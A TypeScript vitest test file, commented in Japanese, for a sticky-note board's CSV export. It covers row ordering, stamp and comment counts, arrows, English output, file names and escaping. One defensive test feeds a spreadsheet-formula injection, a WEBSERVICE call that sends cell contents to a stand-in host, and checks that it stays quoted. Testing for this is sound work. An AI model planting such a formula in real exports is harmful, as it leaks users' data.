// CSV の書き出しのテスト（エミュレーター不要）
import { describe, expect, it } from 'vitest';
import { useLang } from '../src/i18n';
import { buildBoardCsv, csvFileName, inReadingOrder, orderRows } from '../src/lib/exportCsv';
import type { BoardComment, BoardObject } from '../src/types';

// 見出しや説明は表示の言語で出すので、基本は日本語で確かめる
useLang.setState({ lang: 'ja' });

const at = (iso: string) => ({ toDate: () => new Date(iso) }) as never;

function base(id: string, x: number, y: number) {
  return {
    id,
    x,
    y,
    z: 1,
    createdBy: { uid: 'u1', name: 'Alice', photoURL: null },
    createdAt: at('2026-10-25T14:05:00'),
    updatedBy: 'u1',
    updatedAt: null,
    deleted: false,
    locked: false,
  };
}

const section = (id: string, title: string, x: number, y: number): BoardObject => ({
  ...base(id, x, y),
  type: 'section',
  w: 500,
  h: 400,
  title,
  color: 'gray',
});

const sticky = (id: string, text: string, x: number, y: number, parentId: string | null = null): BoardObject => ({
  ...base(id, x, y),
  type: 'sticky',
  w: 160,
  h: 160,
  text,
  color: 'yellow',
  parentId,
});

const text = (id: string, value: string, x: number, y: number): BoardObject => ({
  ...base(id, x, y),
  type: 'text',
  w: 300,
  h: 40,
  text: value,
  fontSize: 24,
  color: 'black',
  autoWidth: true,
  parentId: null,
});

const stamp = (id: string, targetId: string, kind: 'like' | 'heart' | 'face'): BoardObject => ({
  ...base(id, 0, 0),
  type: 'stamp',
  stampKind: kind,
  targetId,
});

const board: BoardObject[] = [
  text('t1', 'お題', 0, -200),
  section('keep', 'Keep', 1200, 0),
  section('start', 'Start', 0, 0),
  sticky('s3', 'ペアプロ', 1300, 100, 'keep'),
  sticky('s2', '右の付箋', 300, 100, 'start'),
  sticky('s1', '左の付箋', 50, 110, 'start'),
  sticky('s4', '下の付箋', 50, 300, 'start'),
  sticky('memo', 'メモ', 0, 900),
  stamp('a', 's1', 'like'),
  stamp('b', 's1', 'like'),
  stamp('c', 's1', 'heart'),
  stamp('d', 'start', 'like'),
  { ...sticky('gone', '削除済み', 0, 500), deleted: true },
];

const comment = (id: string, targetId: string, name: string, text: string, time: string, deleted = false): BoardComment => ({
  id,
  targetId,
  text,
  createdBy: { uid: name, name, photoURL: null },
  createdAt: at(`2026-10-25T${time}:00`),
  updatedAt: null,
  edited: false,
  deleted,
});

const comments: BoardComment[] = [
  comment('c2', 's1', 'Bob', '賛成です', '14:20'),
  comment('c1', 's1', 'Carol', '15分を超えたら\n別で話す', '14:10'),
  comment('c3', 's1', 'Dave', '消したコメント', '14:30', true),
  // 削除された付箋へのコメントは、付箋と一緒に出さない
  comment('c4', 'gone', 'Bob', '消えた付箋へのコメント', '14:40'),
];

describe('並び順', () => {
  it('セクションをひとまとまりにして、左上から読む順に並べる', () => {
    const rows = orderRows(board);
    expect(rows.map((r) => r.item.text)).toEqual(['お題', '左の付箋', '右の付箋', '下の付箋', 'ペアプロ', 'メモ']);
    expect(rows.map((r) => r.number)).toEqual([1, 2, 3, 4, 5, 6]);
    expect(rows.map((r) => r.section?.title ?? '')).toEqual(['', 'Start', 'Start', 'Start', 'Keep', '']);
  });

  it('数px しか高さが違わないものも同じ行として左から並べる', () => {
    // 以前は 80px ごとに区切っていたため、y=35 と y=40 が別の行になり、右の Keep が先に出ていた
    const rows = orderRows([
      section('start', 'Start', 0, 40),
      section('keep', 'Keep', 1200, 35),
      sticky('a', 'Start の付箋', 50, 100, 'start'),
      sticky('b', 'Keep の付箋', 1250, 100, 'keep'),
    ]);
    expect(rows.map((r) => r.item.text)).toEqual(['Start の付箋', 'Keep の付箋']);
  });

  it('行の一番上から離れたものは次の行にする（少しずつずれて続いても1行にまとめない）', () => {
    expect(inReadingOrder([
      { x: 300, y: 0 },
      { x: 200, y: 70 },
      { x: 100, y: 140 },
    ]).map((p) => p.x)).toEqual([200, 300, 100]);
  });

  it('削除済みは入れない', () => {
    expect(orderRows(board).some((r) => r.item.id === 'gone')).toBe(false);
  });

  it('スタンプは付箋ごとに種類別に数える（セクションに押したものは数えない）', () => {
    const s1 = orderRows(board).find((r) => r.item.id === 's1')!;
    expect(s1.stamps).toMatchObject({ like: 2, heart: 1, face: 0 });
  });
});

describe('CSV の中身', () => {
  const csv = buildBoardCsv('10月のSSK振り返り', board, comments, new Date('2026-10-25T15:30:00'));
  const lines = csv.split('\r\n');

  it('先頭に説明の行、その下に見出しと表が続く', () => {
    expect(lines[0]).toBe('# ボード「10月のSSK振り返り」の付箋（2026/10/25 15:30 書き出し）');
    expect(lines.slice(1, 11).every((l) => l.startsWith('#'))).toBe(true);
    expect(lines[11]).toBe('番号,セクション,種類,文章,色,作成者,作成日時,👍,❤️,⭐,💯,🔥,💡,🤣,👀,❓,顔,スタンプ合計,コメント数,コメント,つなぎ先');
    expect(lines[12]).toBe('1,,テキスト,お題,黒,Alice,2026/10/25 14:05,0,0,0,0,0,0,0,0,0,0,0,0,,');
    expect(csv).not.toContain('N-Board');
  });

  it('どの付箋にも付いていないスタンプの数を説明の行に書く', () => {
    expect(lines[9]).toBe('# どの付箋にも付いていないスタンプ（ボードやセクションに押されたもの）：👍 1');
    const none = buildBoardCsv('b', [sticky('x', 'a', 0, 0)], [], new Date()).split('\r\n')[9];
    expect(none).toBe('# どの付箋にも付いていないスタンプ（ボードやセクションに押されたもの）：なし');
  });

  it('改行・カンマ・引用符を含む文章は1つのセルに収める', () => {
    const out = buildBoardCsv('b', [sticky('x', '1行目\n2行目, "引用"', 0, 0)], [], new Date());
    expect(out).toContain('"1行目\n2行目, ""引用"""');
  });

  it('ボード名にカンマや改行があっても、先頭の説明の行は1つのセルに収める', () => {
    const comma = buildBoardCsv('10月,SSK振り返り', board, comments, new Date('2026-10-25T15:30:00')).split('\r\n')[0];
    expect(comma).toBe('"# ボード「10月,SSK振り返り」の付箋（2026/10/25 15:30 書き出し）"');
    const attack = buildBoardCsv('x,=WEBSERVICE("https://e.example/?d="&A9),', board, comments, new Date('2026-10-25T15:30:00'));
    expect(attack.split('\r\n')[0]).toBe('"# ボード「x,=WEBSERVICE(""https://e.example/?d=""&A9),」の付箋（2026/10/25 15:30 書き出し）"');
    const newline = buildBoardCsv('1行目\r\n=1+1', board, comments, new Date('2026-10-25T15:30:00')).split('\r\n');
    expect(newline[0]).toBe('# ボード「1行目 =1+1」の付箋（2026/10/25 15:30 書き出し）');
    expect(newline[1].startsWith('#')).toBe(true);
  });

  it('数式として動かないよう、=・+・@ で始まる文章の先頭に「\'」を付ける', () => {
    const out = buildBoardCsv('b', [sticky('x', '=1+1', 0, 0), sticky('y', '- 箇条書き', 0, 300)], [], new Date());
    expect(out).toContain(",'=1+1,");
    expect(out).toContain(',- 箇条書き,');
  });
});

describe('コメント', () => {
  const csv = buildBoardCsv('b', board, comments, new Date('2026-10-25T15:30:00'));

  it('付箋の行に、コメント数と「名前：本文」を古い順に改行でつないだものを入れる（削除済みは除く）', () => {
    expect(csv).toContain('2,Start,付箋,左の付箋,黄,Alice,2026/10/25 14:05,2,1,0,0,0,0,0,0,0,0,3,2,"Carol：15分を超えたら\n別で話す\nBob：賛成です",');
    expect(csv).not.toContain('消したコメント');
  });

  it('削除された付箋へのコメントは出さない', () => {
    expect(csv).not.toContain('消えた付箋へのコメント');
  });

  it('説明の行にコメントの列の意味を書く', () => {
    expect(csv).toContain('# 「コメント」は付箋へのコメントで、「名前：本文」を古い順に改行でつないでいます。');
  });
});

describe('矢印', () => {
  const connector = (id: string, fromId: string, toId: string, label = '', deleted = false): BoardObject => ({
    ...base(id, 0, 0),
    type: 'connector',
    fromId,
    toId,
    label,
    deleted,
  });

  it('矢印でつないだ先の番号を、言葉があれば「番号（言葉）」で、番号の順に書く', () => {
    const rows = orderRows([
      ...board,
      connector('k1', 's1', 'memo', 'いいえ'),
      connector('k2', 's1', 's2'),
      // 表にない先（セクション）や、削除した矢印・削除した付箋への矢印は書かない
      connector('k3', 's1', 'start'),
      connector('k4', 's1', 's4', '', true),
      connector('k5', 's1', 'gone'),
    ]);
    const s1 = rows.find((r) => r.item.id === 's1')!;
    expect(s1.next).toEqual([
      { number: 3, label: '' },
      { number: 6, label: 'いいえ' },
    ]);
    const csv = buildBoardCsv('b', [...board, connector('k1', 's1', 'memo', 'いいえ'), connector('k2', 's1', 's2')], [], new Date());
    expect(csv).toContain(',"3, 6（いいえ）"');
  });

  it('両向きの矢印は、両方の行に書く', () => {
    const rows = orderRows([...board, { ...connector('k1', 's1', 's2', 'やりとり'), bothEnds: true } as BoardObject]);
    expect(rows.find((r) => r.item.id === 's1')!.next).toEqual([{ number: 3, label: 'やりとり' }]);
    expect(rows.find((r) => r.item.id === 's2')!.next).toEqual([{ number: 2, label: 'やりとり' }]);
  });
});

describe('英語で書き出す', () => {
  it('見出し・説明・種類・色・コメントを英語にする（中身はそのまま）', () => {
    useLang.setState({ lang: 'en' });
    const csv = buildBoardCsv('Retro', board, comments, new Date('2026-10-25T15:30:00'));
    useLang.setState({ lang: 'ja' });
    const lines = csv.split('\r\n');
    expect(lines[0]).toBe('# Sticky notes on the board "Retro" (exported 2026/10/25 15:30)');
    expect(lines[11]).toBe('No.,Section,Type,Text,Color,Author,Created at,👍,❤️,⭐,💯,🔥,💡,🤣,👀,❓,Face,Total stamps,Comments,Comment text,Arrows to');
    expect(csv).toContain('2,Start,Sticky note,左の付箋,Yellow,Alice,2026/10/25 14:05,2,1,0,0,0,0,0,0,0,0,3,2,"Carol: 15分を超えたら\n別で話す\nBob: 賛成です",');
    expect(csv).toContain('# Stamps not on any sticky note (placed on the board or a section): 👍 1');
  });
});

describe('ファイル名', () => {
  it('ボード名と日付。ファイル名に使えない文字は除く', () => {
    expect(csvFileName('10月の/振り返り?', new Date('2026-10-25T15:30:00'))).toBe('10月の 振り返り_20261025.csv');
    expect(csvFileName('  ', new Date('2026-10-25T15:30:00'))).toBe('ボード_20261025.csv');
  });
});
